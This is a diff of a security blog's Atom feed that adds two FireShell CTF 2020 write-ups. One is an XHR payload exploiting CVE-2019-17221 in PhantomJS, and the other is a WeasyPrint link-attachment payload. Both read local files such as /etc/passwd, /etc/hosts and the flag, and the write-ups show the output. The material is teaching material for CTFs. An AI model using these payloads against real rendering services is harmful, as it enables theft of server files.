@@ -1,5 +1,129 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>securitytaters</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2020-03-09T08:00:00+05:30</updated><entry><title>Solving Chatt with Bratt from UTCTF 2020</title><link href="/solving-chatt-with-bratt-from-utctf-2020.html" rel="alternate"></link><published>2020-03-09T08:00:00+05:30</published><updated>2020-03-09T08:00:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2020-03-09:/solving-chatt-with-bratt-from-utctf-2020.html</id><summary type="html">&lt;p&gt;Challenge included simple Stored XSS to steal cookies in a chat application.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The CTF challenge note:&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>securitytaters</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2020-03-23T09:00:00+05:30</updated><entry><title>Solving Screenshoter from FireShell CTF 2020</title><link href="/solving-screenshoter-from-fireshell-ctf-2020.html" rel="alternate"></link><published>2020-03-23T09:00:00+05:30</published><updated>2020-03-23T09:00:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2020-03-23:/solving-screenshoter-from-fireshell-ctf-2020.html</id><summary type="html">&lt;p&gt;Challenge based on CVE-2019-17221 - arbitrary file read in PhantomJS through 2.1.1.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The &lt;strong&gt;Screenshoter&lt;/strong&gt; from &lt;strong&gt;FireShell CTF 2020&lt;/strong&gt; challenge had below note:&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Turn&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;beautiful&lt;/span&gt; &lt;span class="n"&gt;website&lt;/span&gt; &lt;span class="k"&gt;into&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;our&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;tool&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
+
+&lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;
+
+&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;screenshoter&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fireshellsecurity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;team&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;The challenge page has an option to provide URL which will be accessed and a screenshot of the page retrieved would be provided, as a service. This is quite similar to their &lt;strong&gt;URL to PDF&lt;/strong&gt; challenge. Using requestbin we can see that the provide URL is accessed with user agent &lt;strong&gt;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="screenshoter" src="img/9.1.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="UA" src="img/9.2.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Searching around for vulnerabilities around PhantomJS/2.1.1 lands us to &lt;a href="https://github.com/h4ckologic/CVE-2019-17221/blob/master/PhantonJS_Arbitrary_File_Read.pdf"&gt;this&lt;/a&gt; research. As explained in the PDF its possible to retrieve files from remote host using XHR requests. So I copied the payload from the research and hosted it on &lt;a href="https://filebin.net/"&gt;filebin&lt;/a&gt;. Payload was as follows&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;XMLHttpRequest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
+&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;responseText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;file:///etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Lets understand the code a bit. A &lt;strong&gt;XMLHttpRequest&lt;/strong&gt; object is created and assigned to &lt;strong&gt;x&lt;/strong&gt; at line 5. &lt;strong&gt;function&lt;/strong&gt; will run once the page loads due to &lt;strong&gt;onload&lt;/strong&gt; event at line 6 and write the response received from the request in the HTML page at line 7. Line 9 and 10 will make a request to &lt;strong&gt;/etc/passwd&lt;/strong&gt; on the system where the HTML page is running due to the &lt;strong&gt;file://&lt;/strong&gt; URI scheme and retrieve its contents. Usually &lt;strong&gt;file:///etc/passwd&lt;/strong&gt; is replaced by some URL such as &lt;strong&gt;https://securitytaters.info/&lt;/strong&gt; in normal XHR requests.&lt;/p&gt;
+&lt;p&gt;Supplying the URL from filebin with above payload executed it and gave us the results of  &lt;strong&gt;/etc/passwd&lt;/strong&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="passwd" src="img/9.3.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Replacing &lt;strong&gt;/etc/passwd&lt;/strong&gt;  with &lt;strong&gt;/flag&lt;/strong&gt; as mentioned in the challenge note gave me the flag.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="flag" src="img/9.4.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Thanks for reading and thanks FireShell team from the challs. Feel free to contact me on twitter for any queries or feedback. Cheers!!!&lt;/p&gt;</content><category term="CTF"></category><category term="webappsec"></category><category term="phantomjs"></category><category term="file read"></category><category term="writeup"></category></entry><entry><title>Solving URL to PDF from FireShell CTF 2020</title><link href="/solving-url-to-pdf-from-fireshell-ctf-2020.html" rel="alternate"></link><published>2020-03-23T09:00:00+05:30</published><updated>2020-03-23T09:00:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2020-03-23:/solving-url-to-pdf-from-fireshell-ctf-2020.html</id><summary type="html">&lt;p&gt;Challenge based on the talk Owning the clout through SSRF and PDF generators.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The &lt;strong&gt;URL to PDF&lt;/strong&gt; from &lt;strong&gt;FireShell CTF 2020&lt;/strong&gt; challenge note:&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Please&lt;/span&gt; &lt;span class="n"&gt;test&lt;/span&gt; &lt;span class="n"&gt;our&lt;/span&gt; &lt;span class="n"&gt;brand&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag&lt;/span&gt;
+
+&lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;urltopdf&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fireshellsecurity&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;team&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Accessing the URL sends us to a website which converts the page at a given URL to PDF. Immediately a talk related to this comes to mind. &lt;strong&gt;Owning the clout through SSRF and PDF generators&lt;/strong&gt; which highlights issues in PDF generation when inputs are not properly validated when generating PDF primarily allowing SSRF or local file read among other things.&lt;/p&gt;
+&lt;p&gt;So let's identify the PDF generator as mentioned in the talk. I am using requestbin here as usual to log requests and analyze it.  &lt;/p&gt;
+&lt;p&gt;&lt;img alt="converter" src="img/8.1.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;We see that the user agent is mentioned as &lt;strong&gt;WeasyPrint 51 (http://weasyprint.org/)&lt;/strong&gt;   &lt;/p&gt;
+&lt;p&gt;&lt;img alt="UA" src="img/8.2.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;Now we need to prepare a HTML page which can be provided for PDF conversion via a URL. As mentioned in the talk we will need to use &lt;strong&gt;&amp;lt;link rel=attachment href="file:///etc/passwd"&gt;&lt;/strong&gt; payload as part of the HTML page. I used &lt;strong&gt;/etc/hosts&lt;/strong&gt; instead of usual passwd file. HTML page was as follows. I hosted it using &lt;a href="https://filebin.net/"&gt;filebin&lt;/a&gt; and provide the URL for PDF generator.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;attachment&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;file:///etc/hosts&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;After downloading the PDF I needed to decode the data from PDF to readable format. Retrieving the contents was something I had to search since results are not displayed directly in the PDF but are hidden inside &lt;strong&gt;FlateDecode&lt;/strong&gt; part of the PDF. The utility mentioned in the talk was not available on the internet or I couldn't find it. After searching around for a while I found a linux utility called qpdf which I used as follows.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;qpdf --qdf --object-streams=disable 1f51f044e0ca6c90d995ab9b4e2bd23c.pdf out.pdf&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Reading the output pdf in text editor gave me the contents of the &lt;strong&gt;/etc/hosts&lt;/strong&gt; as shown.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;span class="err"&gt;stream&lt;/span&gt;
+&lt;span class="err"&gt;# Kubernetes-managed hosts file.&lt;/span&gt;
+&lt;span class="err"&gt;127.0.0.1       localhost&lt;/span&gt;
+&lt;span class="err"&gt;::1     localhost ip6-localhost ip6-loopback&lt;/span&gt;
+&lt;span class="c"&gt;fe00::0 ip6-localnet&lt;/span&gt;
+&lt;span class="c"&gt;fe00::0 ip6-mcastprefix&lt;/span&gt;
+&lt;span class="c"&gt;fe00::1 ip6-allnodes&lt;/span&gt;
+&lt;span class="c"&gt;fe00::2 ip6-allrouters&lt;/span&gt;
+&lt;span class="err"&gt;10.244.0.22     url-to-pdf-8f9ddf549-prfvm&lt;/span&gt;
+&lt;span class="err"&gt;endstream&lt;/span&gt;
+&lt;span class="err"&gt;endobj&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Now replacing the &lt;strong&gt;/etc/hosts&lt;/strong&gt; with &lt;strong&gt;/flag&lt;/strong&gt; as mentioned in the challenge note gave me the flag.&lt;/p&gt;
+&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;span class="err"&gt;stream&lt;/span&gt;
+&lt;span class="err"&gt;F#{th4nk5_t0_Ben_Sadeghipour_&amp;amp;_Cody_Brocious}&lt;/span&gt;
+&lt;span class="err"&gt;endstream&lt;/span&gt;
+&lt;span class="err"&gt;endobj&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+
+&lt;p&gt;Thanks for reading. Feel free to contact me on twitter for any queries or feedback. Cheers!!!&lt;/p&gt;</content><category term="CTF"></category><category term="webappsec"></category><category term="PDF generators"></category><category term="file read"></category><category term="writeup"></category></entry><entry><title>Solving Chatt with Bratt from UTCTF 2020</title><link href="/solving-chatt-with-bratt-from-utctf-2020.html" rel="alternate"></link><published>2020-03-09T08:00:00+05:30</published><updated>2020-03-09T08:00:00+05:30</updated><author><name>0xm4v3rick</name></author><id>tag:None,2020-03-09:/solving-chatt-with-bratt-from-utctf-2020.html</id><summary type="html">&lt;p&gt;Challenge included simple Stored XSS to steal cookies in a chat application.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The CTF challenge note:&lt;/p&gt;
 &lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
